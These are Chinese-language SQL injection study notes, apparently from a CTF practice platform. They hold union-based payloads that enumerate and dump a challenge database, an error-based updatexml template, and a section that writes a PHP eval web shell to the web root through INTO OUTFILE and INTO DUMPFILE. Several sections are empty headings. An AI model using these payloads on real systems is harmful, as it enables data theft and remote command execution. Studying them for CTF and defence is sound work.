# SQL注入

## 		有回显

### 					1，确定类型 

​							数字型												字符型

```sql
XXX/index.php?id=1 AND 1=1 	有数据		XXX/index.php?id=‘1’ AND 1=1 --+ ’ （把后面的‘注释掉
XXX/index.php?id=1 AND 1=2  没有数据    XXX/index.php?id=‘1’ AND 1=1 --+ ’
	--+字符型的将返回为空							数字型的因为‘而报错
							--+确定注入点位置 
XXX/index.php?id=1 {INJECITONS}		   XXX/index.php?id=‘1’{INJECITONS} --+ ’
```

### 					2，确定列数&找回显位置

​						二分法确定列数 

```sql
ORDER BY  --+  {n} 在n超出列数之前不会报错
UNION SELECT 1,2,3,4 --+看返回的字段显示在数字几
```

### 					 3，库名 表名 列名

```sql
id = -1 --+让前面的查询结果失败！！！
--+库名 假设回显位置是2，3
https://bedee61813655592.yulinsec.cn/index.php?id=-1 
UNION SELECT 1,database(),versions()

--+表名
https://bedee61813655592.yulinsec.cn/index.php?id=-1 
UNION SELECT 1,group_concat(table_name),3
FROM information_schema.tables 
WHERE table_schema = database()
--+列名
https://bedee61813655592.yulinsec.cn/index.php?id=-1 
UNION SELECT 1,group_concat(column_name),3 
FROM information_schema.columns 
WHERE table_name = 0x666c6167 --+转换为16进制 避免分号
```

### 					#转换为16—binary

```python
import binascii
def to_16bin(s):
    s = s.encode("utf-8")
    return "0x" + binascii.hexlify(s).decode("utf-8")
```

### 			4，托数据

```sql
https://bedee61813655592.yulinsec.cn/index.php?id=-1 
UNION SELECT 1,group_concat(flag),3
FROM flag 
```

## 		无回显			

### 				1报错注入

```sql
updatexml(1, concat(0x7e, {inje} ), 1)
--+ 1，爆库名
inje = database()
--+ 2
```

YulinSec{aec045a00e7afc016dd

### 								2bool盲注





### 3延时注入



## 三，简单过滤

### 	1



## 四，getshell注入

```sql
-- 方法1:into outfile 一次性写入
?id=-1' union select 1,'<?php @eval($_POST["cmd"]);?>',3 into outfile '/var/www/html/shell.php' --+

-- 方法2:into dumpfile(不换行,写二进制更干净)
select '<?php @eval($_POST["cmd"]);?>' into dumpfile '/var/www/html/shell.php';
```

